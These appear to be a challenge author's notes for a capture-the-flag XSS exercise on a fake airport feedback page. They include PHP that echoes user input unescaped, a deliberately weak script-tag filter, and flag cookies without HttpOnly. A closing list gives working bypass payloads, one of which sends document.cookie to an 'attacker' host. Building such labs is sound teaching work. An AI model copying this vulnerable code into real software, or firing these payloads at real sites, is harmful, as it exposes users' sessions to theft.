XSS


nano index.PHP
----------------
<?php
// Deliberately insecure cookie (NOT HttpOnly)
setcookie("session", "Summit{XSS_Can_Steal_Cookies}", time()+3600, "/");
?>

<!DOCTYPE html>
<html>
<head>
    <title>Summit International Airport Feedback</title>
</head>
<body>
    <h1>Passenger Feedback</h1>
    <p>Leave a comment for airport staff:</p>

    <form method="GET">
        <input type="text" name="comment" size="60">
        <input type="submit">
    </form>

    <hr>

    <p><strong>Latest Comment:</strong></p>
    <div>
        <?php
        if (isset($_GET['comment'])) {
            echo $_GET['comment']; // ❌ vulnerable to XSS
        }
        ?>
    </div>
</body>
</html>
-------------------------------

sudo ln -s ~/webchallenges/web300_xss_cookie /var/www/html/web300


<script>alert(document.cookie)</script>

********************************************************************* NEW CODE *********************************


<?php
// Deliberately insecure cookie (NOT HttpOnly)
// Looks like an ops token, but actually the flag
setcookie(
    "ops_session",
    "Summit{Passenger_Feedback_Exposed_Client_Side_Data}",
    time() + 3600,
    "/"
);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Summit International Airport – Passenger Feedback</title>

    <style>
        body {
            background-color: #0b1c2d;
            color: #e6edf3;
            font-family: monospace;
            padding: 40px;
        }
        h1 {
            color: #4db8ff;
        }
        input[type="text"] {
            width: 520px;
            padding: 6px;
            background-color: #102a43;
            color: #ffffff;
            border: 1px solid #4db8ff;
        }
        input[type="submit"] {
            background-color: #1f6fb2;
            color: #ffffff;
            border: none;
            padding: 6px 12px;
            margin-left: 6px;
            cursor: pointer;
        }
        .comment-box {
            margin-top: 20px;
            padding: 15px;
            border: 1px solid #4db8ff;
            background-color: #071521;
        }
    </style>
</head>

<body>

<h1>Summit International Airport</h1>
<h3>Passenger Feedback Portal</h3>

<p>
Help us improve airport operations.  
All feedback is reviewed by airport staff.
</p>

<form method="GET">
    <input type="text" name="comment" placeholder="Enter feedback here">
    <input type="submit" value="Submit Feedback">
</form>

<hr>

<p><strong>Latest Comment:</strong></p>

<div class="comment-box">
<?php
if (isset($_GET['comment'])) {

    $comment = $_GET['comment'];

    // ❌ Naive XSS filtering (intentionally flawed)
    $blocked = ['<script>', '</script>'];
    $comment = str_replace($blocked, '', $comment);

    // Vulnerable output
    echo $comment;
}
?>
</div>

</body>
</html>


-------------------------------------------------

Inputs that work:


<img src=x onerror=alert(document.cookie)>

<img src=x onerror=fetch('http://attacker/?c='+document.cookie)>
